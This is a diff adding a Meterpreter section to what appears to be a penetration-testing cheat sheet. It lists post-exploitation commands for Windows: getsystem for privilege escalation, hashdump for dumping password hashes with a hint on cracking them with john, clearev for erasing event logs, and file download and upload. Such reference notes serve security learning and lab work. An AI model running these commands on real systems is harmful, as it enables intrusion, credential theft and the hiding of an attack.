@@ -151,6 +151,48 @@ msf6 > info module_name # ex: exploit/windows/http/xxx
 msf6 > info module_index # ex: 0
 ```
 </div></div>
+
+<hr class="sl">
+
+## Meterpreter on Windows
+
+<div class="row row-cols-md-2"><div>
+
+You can use many Linux commands
+
+```bash
+meterpreter > ls # list files
+meterpreter > cd # move
+meterpreter > pwd # path to current folder
+meterpreter > cat file # print file
+meterpreter > edit file # open file in vim
+```
+
+And there are quite a lof of useful "post" modules
+
+```bash
+meterpreter > shell # start a shell
+C:\WINDOWS\system32> whoami
+meterpreter > getsystem
+meterpreter > sysinfo
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM # means that you're an admin
+meterpreter > hashdump # dump usernames/password...
+# try to bruteforce NTML with john format=nt
+meterpreter > clearev # clean logs
+```
+</div><div>
+
+```bash
+meterpreter > idletime # time the host was idle
+meterpreter > ipconfig # network information
+meterpreter > search -f pattern # search file by pattern
+meterpreter > search -f pattern from* # ... inside given directories
+meterpreter > download c:\\path # download to your machine
+meterpreter > upload local_file c:\\path # upload
+```
+</div></div>
+
 <hr class="sr">
 
 ## msfconsole, and nessus
